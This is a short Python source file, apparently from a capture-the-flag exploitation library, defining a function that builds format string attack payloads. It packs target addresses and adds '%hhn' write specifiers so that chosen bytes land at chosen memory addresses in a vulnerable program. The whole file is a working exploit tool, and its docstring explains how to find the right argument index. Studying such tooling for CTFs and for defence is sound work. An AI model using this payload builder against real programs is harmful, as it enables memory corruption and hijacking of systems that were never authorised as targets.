from toyotama.pwn.util import *

def fsa_write(target_addr: list, contents: list, nth_word: int, offset=0):
    """
    target_addr: The address where the content will be written
    contents: What you want to write
    sofar: The number of characters written so far 
    nth_word: example 1-indexed
                "AAAA%p %p %p..."
                -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                -> 7th (0x4141d402)
    offset: from the above, offset is 2 (0x4141d402)

    verified : pwnb0d, Villager A
    """

    # adjust stack alignment
    sofar = 0
    payload = fill(-offset%4)
    if offset != 0:
        nth_word += 1

    for t_addr in target_addr:
        for i in range(4):
            payload += p32(t_addr+i)
            sofar += 4

    for content in contents:
        for byte in bytes.fromhex(f'{content:08x}')[::-1]:
            offset = (byte-sofar) % 0x100
            sofar = byte
            payload += f'%{offset}x%{nth_word}$hhn'.encode()
            nth_word += 1

    return payload

